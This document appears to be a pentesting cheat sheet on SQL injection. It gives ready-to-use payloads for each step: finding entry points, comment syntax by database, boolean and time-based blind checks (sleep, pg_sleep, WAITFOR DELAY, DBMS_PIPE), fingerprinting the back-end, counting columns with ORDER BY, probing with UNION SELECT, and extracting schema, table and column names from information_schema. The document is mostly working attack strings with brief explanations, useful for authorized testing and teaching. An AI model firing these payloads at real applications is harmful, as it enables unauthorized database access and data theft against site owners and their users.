# Entry point detection
```
'
"
`
')
")
`)
'))
"))
`))
```
Then, you need to know how to fix the query so there isn't errors. In order to fix the query you can input data so the previous query accept the new data, or you can just input your data and add a comment symbol add the end
# Comments
```
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
# Confirming with logical operations
One of the best ways to confirm a SQL injection is by making it operate a logical operation and having the expected results.

For example: if the GET parameter ?username=Peter returns the same content as ?username=Peter' or '1'='1 then, you found a SQL injection.

Also you can apply this concept to mathematical operations. Example: If ?id=1 returns the same as ?id=2-1, SQLinjection.
```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
This word-list was created to try to confirm SQLinjections in the proposed way:
[sqli-logic.txt](sqli-logic.txt)
# Confirming with Timing
###  blind SQL injections 
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
# Identifying Back-end
The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the sleep functions of the previous section or these ones:
```
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
# Order/Group by
to determine the number of columns in the query.
```
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```
# UNION SELECT
```
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
You should use nullvalues as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case.
# Extract database names, table names and column names
```
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
